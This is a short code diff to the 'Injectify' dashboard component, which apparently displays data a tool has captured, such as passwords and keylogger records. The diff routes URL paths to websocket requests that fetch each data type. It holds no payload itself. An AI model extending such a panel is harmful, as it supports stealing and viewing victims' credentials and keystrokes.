@@ -124,10 +124,21 @@ class Injectify extends Component {
 			}
 			if (window.location.pathname.toLowerCase().slice(0, 10) == "/projects/") {
 				let project = window.location.pathname.slice(10).split("/")[0]
+				let type = 'passwords'
+				if (window.location.href.slice(-10) == "/keylogger") type = 'keylogger'
+				if (window.location.href.slice(-7 ) == "/inject") type = 'inject'
+				if (window.location.href.slice(-7 ) == "/config") type = ''
 				if (project) {
 					socket.emit("project:read", {
-						name: decodeURIComponent(project)
+						name: decodeURIComponent(project),
+						type: 'overview'
 					})
+					if (type) {
+						socket.emit("project:read", {
+							name: decodeURIComponent(project),
+							type: type
+						})
+					}
 				}
 			}
 			console.log("%c[websocket] " + "%cauth:github =>", "color: #ef5350", "color:  #FF9800", data)
